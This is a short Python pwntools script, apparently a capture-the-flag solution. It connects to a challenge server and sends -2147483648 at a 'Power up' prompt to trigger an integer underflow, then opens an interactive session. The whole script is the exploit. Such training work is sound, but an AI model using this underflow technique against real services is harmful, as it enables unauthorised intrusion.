from pwn import *

HOST = 'chals.cyberthon22t.ctf.sg'  # Update accordingly
PORT = 20501  # Update accordingly

elf = context.binary = ELF('over_nine_thousand')  # Update accordingly

POWER_UP_PROMPT = b'Power up => '

io = remote(HOST, PORT)

payload = b'-2147483648'  # integer underflow, smallest allowed int

io.sendlineafter(POWER_UP_PROMPT, payload)

io.interactive()
